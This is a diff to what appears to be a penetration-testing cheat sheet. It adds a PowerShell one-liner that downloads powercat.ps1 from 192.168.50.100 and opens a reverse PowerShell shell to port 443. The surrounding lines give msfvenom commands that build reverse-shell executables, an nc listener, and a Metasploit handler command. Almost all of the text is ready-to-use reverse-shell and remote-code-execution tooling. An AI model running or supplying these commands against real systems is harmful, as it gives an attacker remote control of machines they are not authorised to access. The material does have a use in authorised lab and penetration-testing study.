@@ -102,6 +102,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
     msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
     msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
+    IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.50.100/powercat.ps1'); powercat -c 192.168.50.100 -p 443 -e powershell
     ...
     rlwrap nc -nvlp  443
     msfconsole -x "use exploit/multi/handler;set payload windows/powershell_reverse_tcp;set LHOST 192.168.50.100;set LPORT 443;run;"
